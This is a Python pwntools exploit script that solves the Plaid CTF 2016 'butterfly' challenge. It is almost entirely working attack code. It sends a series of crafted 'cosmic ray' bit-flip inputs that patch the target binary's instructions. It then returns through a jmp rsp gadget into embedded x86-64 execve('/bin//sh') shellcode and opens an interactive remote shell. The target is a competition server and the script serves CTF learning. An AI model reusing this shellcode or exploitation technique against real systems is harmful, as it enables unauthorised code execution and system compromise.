#!/usr/bin/env python
#
# Plaid CTF 2016
# butterfly (CRYPTO/200)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

from pwn import *
from struct import pack, unpack

shellcode = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"

host = 'butterfly.pwning.xxx'
port = 9999

function_start_addr = 0x400788
rsp_adjust_addr = 0x400863
jmp_rax_addr = 0x4006E6
jnz_stckchk_addr = 0x40085B
fgets_cnt_addr = 0x4007C4
mov_edx_5_addr = 0x400830
mov_r15_rbp_addr = 0x4007F1
scratch_addr = 0x600D10

jmp_rsp = 0x4006E5
padding = "\x90" * 32
adjust_rsp_instr = "\x48\x83\xEC\x60"

pop_rbx = 'A'*8
pop_r14 = 'B'*8
pop_r15 = 'C'*8
pop_rbp = 'D'*8

cosmic_ray_0 = str(((rsp_adjust_addr << 3) | 6)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)
cosmic_ray_1 = str(((jmp_rax_addr << 3) | 2)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)
cosmic_ray_2 = str(((jnz_stckchk_addr << 3) | 6)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)
cosmic_ray_3 = str(((fgets_cnt_addr << 3) | 6)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)
cosmic_ray_4 = str(((mov_edx_5_addr << 3) | 1)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)
cosmic_ray_5 = str(((mov_r15_rbp_addr << 3) | 3)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)
cosmic_ray_6 = str(((scratch_addr << 3) | 1)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)

h = remote(host, port, timeout = None)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_0)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_1)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_2)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_3)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_4)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_5)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_6)
h.recvuntil('COSMIC RAY?\n')

h.sendline(str(((scratch_addr << 3) | 1)) + padding + pack('<Q', jmp_rsp) + adjust_rsp_instr + shellcode)

print h.interactive()